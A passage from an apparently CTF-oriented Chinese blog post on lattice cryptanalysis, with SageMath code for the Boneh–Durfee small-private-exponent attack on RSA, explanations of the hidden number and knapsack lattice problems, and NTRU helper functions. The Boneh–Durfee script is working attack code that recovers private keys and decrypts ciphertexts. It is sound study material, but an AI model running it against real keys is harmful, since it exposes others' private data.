class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(</span><br><span class="line">                        bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u,x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x * y + <span class="number">1</span> - u)  <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX * YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)  <span class="comment"># substitution</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u ^ kk * y ^ jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus ^ (mm * nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt;= PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line">                pol2 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt;= PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = </span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = </span><br><span class="line">    <span class="comment"># the cipher</span></span><br><span class="line">    c = </span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span>  <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span>  <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span> - <span class="number">2</span> * delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span> * floor(N ^ delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N ^ (<span class="number">1</span> / <span class="number">2</span>))  <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]d is &#x27;</span> + <span class="built_in">str</span>(d))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]m is: &#x27;</span> + <span class="built_in">str</span>(m))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]hex(m) is: &#x27;</span> + <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(m)))</span><br><span class="line">        <span class="comment"># print (&#x27;[-]str(m) is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[!]no solution was found!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Timer: %s s&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">example()</span><br></pre></td></tr></table></figure><h3 id="HNP-Hidden-number-problem"><a href="#HNP-Hidden-number-problem" class="headerlink" title="HNP (Hidden number problem)"></a>HNP (Hidden number problem)</h3><p>给定一个大质数 $p$ ，和许多 $t\in\mathbb{F_p}$ 和其对应的 $MSB_{l,p}(\alpha\cdot t)$ ，来找 $\alpha$。</p><blockquote><p>啥是 $MSB$ ？</p><p>$MSB_{l,p}(x)$ 表示的是任意一个满足 $|(x\ mod\ p)-u|\leq\frac{p}{2^{l+1}}$ 的 $u$ 。</p><p>也就是说， $MSB_{l,p}(x)$ 可以看成 $x\ mod\ p$ 的 $l$ 个有效高位。</p></blockquote><p>所以看起来是不是挺像 $A\cdot x+B$ ？所以我们或许可以简化这个问题。比方说把它变成下面这个问题：</p><p>如果我们有这些关系，并且有所有的 $A$ 和 $B$ ，来求最开始的 $x$。<br>$$<br>{\begin{cases}<br>A_1\times x+B_1&#x3D;y_1 \\<br>A_2\times y_1+B_2&#x3D;y_2 \\<br>\cdots \\<br>A_n\times y_{n-1}+B_x&#x3D;y_n<br>\end{cases}}<br>\pmod{m}<br>$$<br>当然这个 $x$ 是小于一个上限 $N$ （upper_bound）的。</p><p>多变量问题显然是困难的，为了减少变量，我们可以将这类关系进行迭代：<br>$$<br>y_2&#x3D;A_2\times y_1+B_2 \\<br>&#x3D;A_2\times(A_1\times x+B_1)+B_2 \\<br>&#x3D;A_1A_2\times x+A_2B_1+B_2 \\<br>&#x3D;A_2’\times x+B_2’<br>$$<br>所以这时，我们得到的就是关于唯一自变量 $x$ 的约束集了。那么我们将这个约束可以写成这样的矩阵：<br>$$<br>M&#x3D;{\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>$$<br>而此时一定有 $\vec{v}&#x3D;{\begin{bmatrix}k_1,k_2,\cdots,k_{n-1},x,1\end{bmatrix}}$ 能够满足 $\vec{v}\cdot M&#x3D;\vec{x}$ ：<br>$$<br>\vec{v}\cdot M<br>&#x3D;{\begin{bmatrix}k_1,k_2,\cdots,k_{n},x,1\end{bmatrix}}\cdot<br>{\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>&#x3D;{\begin{bmatrix}y_1,y_2,\cdots,y_n,x,base\end{bmatrix}}<br>&#x3D;\vec{x}<br>$$<br>那么只要格子构造和优化的足够优秀，LLL格基规约后即可找到这样的 $SVP$ 或者 $CVP$ 。</p><blockquote><p>举个栗子</p><p>倒数第二行是为了保证 $x$ 的大小与其他相同</p><p>倒数第一行是为了保证最后一行的向量只被加了一次</p></blockquote><h3 id="Knapsack-Lattice-0-amp-1knapsack-problem"><a href="#Knapsack-Lattice-0-amp-1knapsack-problem" class="headerlink" title="Knapsack (Lattice 0&amp;1knapsack problem)"></a>Knapsack (Lattice 0&amp;1knapsack problem)</h3><p>高纬度的背包问题，利用一个超级递增序列 $M$ 来表示明文，即</p><p>$$<br>C &#x3D; \sum_{i&#x3D;1}^{n}{mbin_i(0\ or\ 1)\times M_i}<br>$$<br>也可以这样理解： $\vec{C}&#x3D;\vec{m}\cdot\vec{M}$ ，当给出 $\vec{C}$ 与 $\vec{M}$ 时寻找合法的 $\vec{m}$ </p><p>《An Introduction to Mathematical Cryptography-Springer-Verlag》一书中提到LLL方式在背包问题中的应用中构造的格子如下<br>$$<br>B^{knapsack}<br>&#x3D;<br>{\begin{bmatrix}<br>2&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;2&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;2&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;2&amp;m_n \\<br>1&amp;1&amp;1&amp;\cdots&amp;1&amp;C<br>\end{bmatrix}}<br>$$<br>LLL后得到的第一个向量取反加一再除2后得到的就是合法的 $\vec{m}$</p><p>但自己在私下想的时候似乎找到了一种另外的解，感觉是对的，但还没仔细证过，构造如下：<br>$$<br>B^{knapsack’}<br>&#x3D;<br>{\begin{bmatrix}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;m_n \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;-C<br>\end{bmatrix}}<br>$$<br>无论选择哪种变换，一定存在一个 $\vec{x}&#x3D;{\begin{bmatrix}1&amp;1&amp;0&amp;\cdots&amp;0&amp;1&amp;\cdots\end{bmatrix}}$ 满足上述关系，并且应该也是最短的，如果做题的时候找到bug，这里还会回来补</p><h3 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h3><p>在讲NTRU之前，先说明几个工具</p><blockquote><p>一般 $n\in(250,2500)$</p><p><code>Zx.&lt;x&gt;</code>表示以 $x$ 为自变量的多项式，比如 $Zx([1,1,4,5,1,4])&#x3D;1\cdot x^5+1\cdot x^4+5\cdot x^3+4\cdot x^2+1\cdot x+1$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zx.&lt;x&gt;=ZZ[]</span><br></pre></td></tr></table></figure><h4 id="Cyclic-convolution"><a href="#Cyclic-convolution" class="headerlink" title="Cyclic convolution"></a>Cyclic convolution</h4><p>NTRU中的乘法运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f,g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^n-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这个循环是一个有趣的过程，你可以 通过给 $f(x)$ 乘 $x$ 的不同次方来达到旋转系数的目的</p></blockquote><h4 id="Modular-reduction"><a href="#Modular-reduction" class="headerlink" title="Modular reduction"></a>Modular reduction</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">balancedmod</span>(<span class="params">f,q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br></pre></td></tr></table></figure><blockquote><p>是一种特殊的规约（？</p><p>就是使一个多项式的所有系数 $x$ 满足 $x\in(-\frac{q}{2},\frac{q}{2})$ ，变相的模吧</p></blockquote><h4 id="Get-random-polynomials-with-d-nonzero-coefficients"><a href="#Get-random-polynomials-with-d-nonzero-coefficients" class="headerlink" title="Get random polynomials with d nonzero coefficients"></a>Get random polynomials with d nonzero coefficients</h4><p>获得一个只有d项非零系数的多项式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">randomdpoly</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">assert</span> d &lt;= n</span><br><span class="line">    result = n*[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span>-<span class="number">2</span>*randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 id="Division-modulo-primes"><a href="#Division-modulo-primes" class="headerlink" title="Division modulo primes"></a>Division modulo primes</h4><p>多项式下的对一个质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodprime</span>(<span class="params">f,p</span>):</span><br><span class="line">  T = Zx.change_ring(Integers(p)).quotient(x^n - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br></pre></td></tr></table></figure><blockquote><p>简而言之 $f(x)\cdot invertmodprime(f(x),p)\equiv 1\pmod{p}$ （ $p$ 是一个质数）</p></blockquote><h4 id="Division-modulo-powers-of-2"><a href="#Division-modulo-powers-of-2" class="headerlink" title="Division modulo powers of 2"></a>Division modulo powers of 2</h4><p>（补上）非质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodpowerof2</span>(<span class="params">f,q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertmodprime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balancedmod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br></pre></td></tr></table></figure><h4 id="Messages-for-encryption"><a href="#Messages-for-encryption" class="headerlink" title="Messages for encryption"></a>Messages for encryption</h4><p>随机一个多项式，系数 $x$ 满足 $x\in[1,0,-1]$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">randommessage</span>():</span><br><span class="line">    result = <span class="built_in">list</span>(randrange(<span class="number">3</span>) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 